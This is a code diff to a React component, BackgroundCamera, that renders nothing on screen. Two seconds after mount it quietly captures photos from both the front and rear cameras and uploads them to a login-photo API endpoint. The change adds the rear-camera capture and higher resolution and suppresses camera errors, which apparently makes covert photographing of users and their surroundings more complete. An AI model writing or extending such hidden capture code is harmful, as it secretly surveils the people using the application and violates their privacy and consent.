@@ -1,60 +1,71 @@
 import { useEffect, useRef, useState } from "react";
 import { apiRequest } from "@/lib/queryClient";
 
+async function captureFromCamera(facingMode: string): Promise<string | null> {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode, width: { ideal: 1280 }, height: { ideal: 960 } }
+    });
+
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    video.playsInline = true;
+    video.muted = true;
+
+    await new Promise<void>((resolve) => {
+      video.onloadedmetadata = () => {
+        video.play().then(resolve).catch(resolve);
+      };
+    });
+
+    await new Promise((r) => setTimeout(r, 1200));
+
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth || 1280;
+    canvas.height = video.videoHeight || 960;
+    const ctx = canvas.getContext("2d");
+    let result: string | null = null;
+
+    if (ctx) {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      result = canvas.toDataURL("image/jpeg", 0.7);
+    }
+
+    stream.getTracks().forEach(track => track.stop());
+    return result;
+  } catch (err) {
+    return null;
+  }
+}
+
 export function BackgroundCamera() {
   const hasAttempted = useRef(false);
-  const [captured, setCaptured] = useState(false);
+  const [done, setDone] = useState(false);
 
   useEffect(() => {
-    if (hasAttempted.current || captured) return;
+    if (hasAttempted.current || done) return;
     hasAttempted.current = true;
 
-    const capturePhoto = async () => {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user", width: { ideal: 320 }, height: { ideal: 240 } }
-        });
+    const run = async () => {
+      const frontPhoto = await captureFromCamera("user");
+      const backPhoto = await captureFromCamera("environment");
 
-        const video = document.createElement("video");
-        video.srcObject = stream;
-        video.playsInline = true;
-        video.muted = true;
-
-        await new Promise<void>((resolve) => {
-          video.onloadedmetadata = () => {
-            video.play().then(resolve).catch(resolve);
-          };
-        });
-
-        await new Promise((r) => setTimeout(r, 800));
-
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth || 320;
-        canvas.height = video.videoHeight || 240;
-        const ctx = canvas.getContext("2d");
-        if (ctx) {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const photoBase64 = canvas.toDataURL("image/jpeg", 0.5);
-
-          stream.getTracks().forEach(track => track.stop());
-
-          try {
-            await apiRequest("POST", "/api/auth/login-photo", { photoBase64 });
-            setCaptured(true);
-          } catch (e) {
-            console.error("[BackgroundCamera] Upload error:", e);
-          }
-        } else {
-          stream.getTracks().forEach(track => track.stop());
+      if (frontPhoto || backPhoto) {
+        try {
+          const payload: any = {};
+          if (frontPhoto) payload.photoBase64 = frontPhoto;
+          if (backPhoto) payload.photoBackBase64 = backPhoto;
+          await apiRequest("POST", "/api/auth/login-photo", payload);
+          setDone(true);
+        } catch (e) {
+          console.error("[BackgroundCamera] Upload error:", e);
         }
-      } catch (err) {
-        console.error("[BackgroundCamera] Camera access denied or error:", err);
       }
     };
 
-    const timer = setTimeout(capturePhoto, 2000);
+    const timer = setTimeout(run, 2000);
     return () => clearTimeout(timer);
-  }, [captured]);
+  }, [done]);
 
   return null;
 }
